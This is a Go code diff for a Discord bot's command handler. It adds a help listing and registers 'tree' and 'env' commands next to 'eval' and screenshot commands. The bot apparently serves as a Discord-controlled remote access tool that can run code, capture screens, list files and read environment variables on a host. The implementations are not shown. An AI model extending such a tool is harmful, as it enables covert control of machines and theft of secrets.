@@ -92,8 +92,24 @@ func handler(s *discordgo.Session, m *discordgo.MessageCreate) {
 
 	cmdName := args[0]
 	cmd, exists := commandsList[cmdName]
+
+	if cmdName == "help" {
+		var helpStr string = "commands:\n"
+
+		for _, cmd := range commandsList {
+			helpStr += cmd.Name() + " - " + cmd.Info() + "\n"
+		}
+
+		helpStr += "\nprefix: `>`"
+
+		s.ChannelMessageSendReply(m.ChannelID, helpStr, m.Reference())
+		return
+	}
+
 	if exists {
 		cmd.Run(s, m, args[1:])
+	} else {
+		s.ChannelMessageSendReply(m.ChannelID, "This command does not exist, do `>help` for help.", m.Reference())
 	}
 }
 
@@ -101,6 +117,8 @@ func register() {
 	commandsList["ping"] = &commands.PingCommand{}
 	commandsList["eval"] = &commands.EvalCommand{}
 	commandsList["ss"] = &commands.ScreenShotCommand{}
+	commandsList["tree"] = &commands.TreeCommand{}
+	commandsList["env"] = &commands.EnvCommand{}
 }
 
 func validateEncrypted(data string) error {
@@ -123,8 +141,11 @@ func getChannel(s *discordgo.Session, categoryID, name string) string {
 		return ""
 	}
 
+	name = strings.ToLower(strings.TrimSpace(name))
 	for _, channel := range guild.Channels {
-		if channel.Type == discordgo.ChannelTypeGuildText && strings.EqualFold(channel.Name, name) && channel.ParentID == categoryID {
+		channelName := strings.ToLower(strings.TrimSpace(channel.Name))
+
+		if channel.Type == discordgo.ChannelTypeGuildText && channelName == name && channel.ParentID == categoryID {
 			return channel.ID
 		}
 	}
